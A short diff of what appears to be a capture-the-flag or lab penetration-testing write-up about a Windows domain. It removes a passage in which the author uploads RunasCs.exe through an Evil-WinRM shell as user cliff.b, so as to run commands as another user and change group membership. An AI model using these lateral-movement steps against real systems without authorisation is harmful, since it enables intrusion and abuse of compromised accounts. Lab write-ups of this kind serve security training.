@@ -1481,21 +1481,6 @@ Now this user is compromised i can work on removing the user `m.ibabao` from the
 
 Now the user is compromised i can use his access to remove the user from the group
 
-So ill do this with RunAsCs
-
-```python
-*Evil-WinRM* PS C:\Users\cliff.b\Documents> upload RunasCs.exe
-                                        
-Info: Uploading /home/kali/hsm/novacart/RunasCs.exe to C:\Users\cliff.b\Documents\RunasCs.exe
-                                        
-Data: 68948 bytes of 68948 bytes copied
-                                        
-Info: Upload successful!
-```
-Now its uploaded to the shell i had with cliff.b
-
-I can execute commands as another user
-
 ```python
 
 ```
